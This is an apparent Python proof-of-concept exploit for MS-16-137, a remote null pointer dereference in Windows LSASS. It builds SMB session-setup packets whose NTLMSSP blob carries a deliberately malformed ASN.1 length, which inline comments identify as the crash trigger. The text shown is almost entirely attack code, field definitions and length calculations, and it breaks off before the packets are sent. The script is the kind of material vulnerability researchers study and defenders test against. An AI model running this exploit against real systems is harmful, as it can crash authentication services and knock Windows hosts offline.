#!/usr/bin/env python
#MS-16-137 PoC, LSASS Remote Null Ptr Deref
#Author: Laurent Gaffie
import sys, struct
from socket import *
from time import sleep
from odict import OrderedDict

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("error-code", "\x00\x00\x00\x00" ),
        ("flag1", "\x08"),
        ("flag2", "\x01\xc8"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x3c\x1b"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNego(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x00"),
        ("Bcc", "\x62\x00"),
        ("Data", "")
    ])
    
    def calculate(self):
        self.fields["Bcc"] = struct.pack("<H",len(str(self.fields["Data"])))

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("Data", ""),
        ("separator","\x02"),
        ("dialect", "NT LM 0.12\x00"),
    ])


class SMBSessionData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\xec\x00"),              
        ("maxbuff","\x04\x11"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x00\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x4a\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xd4\x00\x00\xa0"),
        ("bcc1","\xb1\x00"),
        #msg ntlm exchange nego. 
        ("ApplicationHeaderTag","\x60"),
        ("ApplicationHeaderLen","\x48"),
        ("AsnSecMechType","\x06"),
        ("AsnSecMechLen","\x06"),
        ("AsnSecMechStr","\x2b\x06\x01\x05\x05\x02"),
        ("ChoosedTag","\xa0"),
        ("ChoosedTagStrLen","\x3e"),
        ("NegTokenInitSeqHeadTag","\x30"),
        ("NegTokenInitSeqHeadLen","\x3c"),
        ("NegTokenInitSeqHeadTag1","\xA0"),
        ("NegTokenInitSeqHeadLen1","\x0e"),
        ("NegTokenInitSeqNLMPTag","\x30"),
        ("NegTokenInitSeqNLMPLen","\x0c"),
        ("NegTokenInitSeqNLMPTag1","\x06"),
        ("NegTokenInitSeqNLMPTag1Len","\x0a"),
        ("NegTokenInitSeqNLMPTag1Str","\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenInitSeqNLMPTag2","\xa2"),
        ("NegTokenInitSeqNLMPTag2Len","\x2a"),
        ("NegTokenInitSeqNLMPTag2Octet","\x04"),
        ("NegTokenInitSeqNLMPTag2OctetLen","\x28"),
        ("NegTokenInitSeqMechSignature","\x4E\x54\x4c\x4d\x53\x53\x50\x00"),
        ("NegTokenInitSeqMechMessageType","\x01\x00\x00\x00"), 
        ("NegTokenInitSeqMechMessageFlags","\x07\x82\x08\xa2"), 
        ("NegTokenInitSeqMechMessageDomainNameLen","\x00\x00"),
        ("NegTokenInitSeqMechMessageDomainNameMaxLen","\x00\x00"),
        ("NegTokenInitSeqMechMessageDomainNameBuffOffset","\x00\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageWorkstationNameLen","\x00\x00"),
        ("NegTokenInitSeqMechMessageWorkstationNameMaxLen","\x00\x00"),
        ("NegTokenInitSeqMechMessageWorkstationNameBuffOffset","\x00\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh","\x05"),
        ("NegTokenInitSeqMechMessageVersionLow","\x01"),
        ("NegTokenInitSeqMechMessageVersionBuilt","\x28\x0a"),
        ("NegTokenInitSeqMechMessageVersionReserved","\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType","\x0f"),
        ("NegTokenInitSeqMechMessageVersionTerminator","\x00"),
        ("nativeOs","Windows 2002 Service Pack 3 2600"),
        ("nativeOsterminator","\x00\x00"),
        ("nativelan","Windows 2002 5.1"),
        ("nativelanterminator","\x00\x00\x00\x00"),

    ])
    def calculate(self): 

        self.fields["nativeOs"] = self.fields["nativeOs"].encode('utf-16le')
        self.fields["nativelan"] = self.fields["nativelan"].encode('utf-16le')

        CompleteSMBPacketLen = str(self.fields["wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["reserved"])+str(self.fields["andxoffset"])+str(self.fields["maxbuff"])+str(self.fields["maxmpx"])+str(self.fields["vcnum"])+str(self.fields["sessionkey"])+str(self.fields["securitybloblength"])+str(self.fields["reserved2"])+str(self.fields["capabilities"])+str(self.fields["bcc1"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["nativeOs"])+str(self.fields["nativeOsterminator"])+str(self.fields["nativelan"])+str(self.fields["nativelanterminator"])


        SecBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])


        data3 = str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        data4 = str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        data5 = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["nativeOs"])+str(self.fields["nativeOsterminator"])+str(self.fields["nativelan"])+str(self.fields["nativelanterminator"])

        data6 = str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        data7 = str(self.fields["NegTokenInitSeqMechSignature"])+str(self.fields["NegTokenInitSeqMechMessageType"])+str(self.fields["NegTokenInitSeqMechMessageFlags"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageDomainNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameMaxLen"])+str(self.fields["NegTokenInitSeqMechMessageWorkstationNameBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        data10 = str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])
       
        data11 = str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])


        ## Packet len
        self.fields["andxoffset"] = struct.pack("<h", len(CompleteSMBPacketLen)+32)
        ##Buff Len
        self.fields["securitybloblength"] = struct.pack("<h", len(SecBlobLen))
        ##Complete Buff Len
        self.fields["bcc1"] = struct.pack("<h", len(CompleteSMBPacketLen)-27)
        ##App Header
        self.fields["ApplicationHeaderLen"] = struct.pack("<B", len(SecBlobLen)-2)
        ##Asn Field 1
        self.fields["AsnSecMechLen"] = struct.pack("<B", len(str(self.fields["AsnSecMechStr"])))
        ##Asn Field 1
        self.fields["ChoosedTagStrLen"] = struct.pack("<B", len(data3))
        ##SpNegoTokenLen
        self.fields["NegTokenInitSeqHeadLen"] = struct.pack("<B", len(data4))
        ##NegoTokenInit
        self.fields["NegTokenInitSeqHeadLen1"] = struct.pack("<B", len(data10)) 
        ## Tag0 Len
        self.fields["NegTokenInitSeqNLMPLen"] = struct.pack("<B", len(data11))
        ## Tag0 Str Len
        self.fields["NegTokenInitSeqNLMPTag1Len"] = struct.pack("<B", len(str(self.fields["NegTokenInitSeqNLMPTag1Str"])))
        ## Tag2 Len
        self.fields["NegTokenInitSeqNLMPTag2Len"] = struct.pack("<B", len(data6))
        ## Tag3 Len
        self.fields["NegTokenInitSeqNLMPTag2OctetLen"] = struct.pack("<B", len(data7))

#########################################################################################################

class SMBSession2(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\xfa\x00"),
        ("maxbuff","\x04\x11"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x01\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x59\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xd4\x00\x00\xa0"),
        ("bcc1","\xbf\x00"), 
        ("ApplicationHeaderTag","\xa1"),
        ("ApplicationHeaderTagLenOfLen","\x84"),#//BUG --> Trigger is this specific ASN "\x84" (unsigned int) definition. Since len of sec blob is <255 the correct value should be \x81.
        ("ApplicationHeaderLen","\xf6"),#//BUG --> should be \xd1, lsass ASN parser is reading \xf6 + the next 3 chars (\x30\x81\xce) as len.
        ("AsnSecMechType","\x30"), 
        ("AsnSecMechLenOfLen","\x81"),
        ("AsnSecMechLen","\xce"),
        ("ChoosedTag","\xa2"),
        ("ChoosedTagLenOfLen","\x81"),#
        ("ChoosedTagLen","\xcb"),
        ("ChoosedTag1","\x04"),
        ("ChoosedTag1StrLenOfLen","\x81"),
        ("ChoosedTag1StrLen","\xc8"),#
        #### NTLM Offset starts here... ####
        ("NLMPAuthMsgSignature",  "\x4E\x54\x4c\x4d\x53\x53\x50\x00"),
        ("NLMPAuthMsgMessageType","\x03\x00\x00\x00"),
        ("NLMPAuthMsgLMChallengeLen","\x18\x00"),
        ("NLMPAuthMsgLMChallengeMaxLen","\x18\x00"),
        ("NLMPAuthMsgLMChallengeBuffOffset","\x88\x00\x00\x00"),
        ("NLMPAuthMsgNtChallengeResponseLen","\x08\x00"), 
        ("NLMPAuthMsgNtChallengeResponseMaxLen","\x08\x00"), 
        ("NLMPAuthMsgNtChallengeResponseBuffOffset","\xa0\x00\x00\x00"),
        ("NLMPAuthMsgNtDomainNameLen","\x08\x00"),
        ("NLMPAuthMsgNtDomainNameMaxLen","\x08\x00"),
        ("NLMPAuthMsgNtDomainNameBuffOffset","\x48\x00\x00\x00"),
        ("NLMPAuthMsgNtUserNameLen","\x1a\x00"), 
        ("NLMPAuthMsgNtUserNameMaxLen","\x1a\x00"), 
        ("NLMPAuthMsgNtUserNameBuffOffset","\x50\x00\x00\x00"),
        ("NLMPAuthMsgNtWorkstationLen","\x1e\x00"),
        ("NLMPAuthMsgNtWorkstationMaxLen","\x1e\x00"),
        ("NLMPAuthMsgNtWorkstationBuffOffset","\x6a\x00\x00\x00"),
        ("NLMPAuthMsgRandomSessionKeyMessageLen","\x00\x00"),
        ("NLMPAuthMsgRandomSessionKeyMessageMaxLen","\x00\x00"),
        ("NLMPAuthMsgRandomSessionKeyMessageBuffOffset","\x69\x00\x00\x00"),
        ("NLMPAuthMsgNtNegotiateFlags","\x05\x8A\x88\xa2"),
        ("NegTokenInitSeqMechMessageVersionHigh","\x05"),
        ("NegTokenInitSeqMechMessageVersionLow","\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt","\xce\x0e"),
        ("NegTokenInitSeqMechMessageVersionReserved","\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType","\x0f"),
        ("NLMPAuthMsgNtDomainName","SMB1"),
        ("NLMPAuthMsgNtUserName","LGANDX"),
        ("NLMPAuthMsgNtWorkstationName","LGANDX"),
        ("NLMPAuthLMChallengeStr", "\x06\xd7\x34\x6c\x40\x32\xe2\x97\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NLMPAuthMsgNTLMV1ChallengeResponseStruct","\xa8\x8c\xd8\x6c\x0e\x22\x08\x16\xb0\xf9\xc9\x64\x28\x74\x80\x05\x27\xc5\xc7\xf7\xc5\x88\xee\xdc"),
        ("NLMPAuthMsgNSessionKey","\xd8\xb3\x3a\x17\x94\xf7\x6d\xad\x5f\xd4\xc7\x91\xcb\x14\xbd\x4e"),
        ("NLMPAuthMsgNull","\x00"),
        ("nativeOs","Windows 2002 Service Pack 3 2600"),
        ("nativeOsterminator","\x00\x00"),
        ("ExtraNull","\x00\x00"),
        ("nativelan","Windows 2002 5.1"),
        ("nativelanterminator","\x00\x00\x00\x00"),
        ("AndxPadding","\x00\x00"),
        ])

    def calculate(self):

        ##Convert strings to Unicode before any Len calc.
        self.fields["NLMPAuthMsgNtUserName"] = self.fields["NLMPAuthMsgNtUserName"].encode('utf-16le')
        self.fields["NLMPAuthMsgNtDomainName"] = self.fields["NLMPAuthMsgNtDomainName"].encode('utf-16le')
        self.fields["NLMPAuthMsgNtWorkstationName"] = self.fields["NLMPAuthMsgNtWorkstationName"].encode('utf-16le')
        self.fields["nativeOs"] = self.fields["nativeOs"].encode('utf-16le')
        self.fields["nativelan"] = self.fields["nativelan"].encode('utf-16le')

        CompletePacketLen = str(self.fields["wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["reserved"])+str(self.fields["andxoffset"])+str(self.fields["maxbuff"])+str(self.fields["maxmpx"])+str(self.fields["vcnum"])+str(self.fields["sessionkey"])+str(self.fields["securitybloblength"])+str(self.fields["reserved2"])+str(self.fields["capabilities"])+str(self.fields["bcc1"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["NLMPAuthMsgSignature"])+str(self.fields["NLMPAuthMsgMessageType"])+str(self.fields["NLMPAuthMsgLMChallengeLen"])+str(self.fields["NLMPAuthMsgLMChallengeMaxLen"])+str(self.fields["NLMPAuthMsgLMChallengeBuffOffset"])+str(self.fields["NLMPAuthMsgNtChallengeResponseLen"])+str(self.fields["NLMPAuthMsgNtChallengeResponseMaxLen"])+str(self.fields["NLMPAuthMsgNtChallengeResponseBuffOffset"])+str(self.fields["NLMPAuthMsgNtDomainNameLen"])+str(self.fields["NLMPAuthMsgNtDomainNameMaxLen"])+str(self.fields["NLMPAuthMsgNtDomainNameBuffOffset"])+str(self.fields["NLMPAuthMsgNtUserNameLen"])+str(self.fields["NLMPAuthMsgNtUserNameMaxLen"])+str(self.fields["NLMPAuthMsgNtUserNameBuffOffset"])+str(self.fields["NLMPAuthMsgNtWorkstationLen"])+str(self.fields["NLMPAuthMsgNtWorkstationMaxLen"])+str(self.fields["NLMPAuthMsgNtWorkstationBuffOffset"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageLen"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageMaxLen"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageBuffOffset"])+str(self.fields["NLMPAuthMsgNtNegotiateFlags"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NLMPAuthMsgNtDomainName"])+str(self.fields["NLMPAuthMsgNtUserName"])+str(self.fields["NLMPAuthMsgNtWorkstationName"])+str(self.fields["NLMPAuthLMChallengeStr"])+str(self.fields["NLMPAuthMsgNTLMV1ChallengeResponseStruct"])+str(self.fields["NLMPAuthMsgNSessionKey"])+str(self.fields["NLMPAuthMsgNull"])+str(self.fields["nativeOs"])+str(self.fields["nativeOsterminator"])+str(self.fields["ExtraNull"])+str(self.fields["nativelan"])+str(self.fields["nativelanterminator"])

        SecurityBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["NLMPAuthMsgSignature"])+str(self.fields["NLMPAuthMsgMessageType"])+str(self.fields["NLMPAuthMsgLMChallengeLen"])+str(self.fields["NLMPAuthMsgLMChallengeMaxLen"])+str(self.fields["NLMPAuthMsgLMChallengeBuffOffset"])+str(self.fields["NLMPAuthMsgNtChallengeResponseLen"])+str(self.fields["NLMPAuthMsgNtChallengeResponseMaxLen"])+str(self.fields["NLMPAuthMsgNtChallengeResponseBuffOffset"])+str(self.fields["NLMPAuthMsgNtDomainNameLen"])+str(self.fields["NLMPAuthMsgNtDomainNameMaxLen"])+str(self.fields["NLMPAuthMsgNtDomainNameBuffOffset"])+str(self.fields["NLMPAuthMsgNtUserNameLen"])+str(self.fields["NLMPAuthMsgNtUserNameMaxLen"])+str(self.fields["NLMPAuthMsgNtUserNameBuffOffset"])+str(self.fields["NLMPAuthMsgNtWorkstationLen"])+str(self.fields["NLMPAuthMsgNtWorkstationMaxLen"])+str(self.fields["NLMPAuthMsgNtWorkstationBuffOffset"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageLen"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageMaxLen"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageBuffOffset"])+str(self.fields["NLMPAuthMsgNtNegotiateFlags"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NLMPAuthMsgNtDomainName"])+str(self.fields["NLMPAuthMsgNtUserName"])+str(self.fields["NLMPAuthMsgNtWorkstationName"])+str(self.fields["NLMPAuthLMChallengeStr"])+str(self.fields["NLMPAuthMsgNTLMV1ChallengeResponseStruct"])+str(self.fields["NLMPAuthMsgNSessionKey"])

        CalculateOffsets = str(self.fields["NLMPAuthMsgSignature"])+str(self.fields["NLMPAuthMsgMessageType"])+str(self.fields["NLMPAuthMsgLMChallengeLen"])+str(self.fields["NLMPAuthMsgLMChallengeMaxLen"])+str(self.fields["NLMPAuthMsgLMChallengeBuffOffset"])+str(self.fields["NLMPAuthMsgNtChallengeResponseLen"])+str(self.fields["NLMPAuthMsgNtChallengeResponseMaxLen"])+str(self.fields["NLMPAuthMsgNtChallengeResponseBuffOffset"])+str(self.fields["NLMPAuthMsgNtDomainNameLen"])+str(self.fields["NLMPAuthMsgNtDomainNameMaxLen"])+str(self.fields["NLMPAuthMsgNtDomainNameBuffOffset"])+str(self.fields["NLMPAuthMsgNtUserNameLen"])+str(self.fields["NLMPAuthMsgNtUserNameMaxLen"])+str(self.fields["NLMPAuthMsgNtUserNameBuffOffset"])+str(self.fields["NLMPAuthMsgNtWorkstationLen"])+str(self.fields["NLMPAuthMsgNtWorkstationMaxLen"])+str(self.fields["NLMPAuthMsgNtWorkstationBuffOffset"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageLen"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageMaxLen"])+str(self.fields["NLMPAuthMsgRandomSessionKeyMessageBuffOffset"])+str(self.fields["NLMPAuthMsgNtNegotiateFlags"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        CalculateUserOffset = CalculateOffsets+str(self.fields["NLMPAuthMsgNtDomainName"])

        CalculateDomainOffset = CalculateOffsets

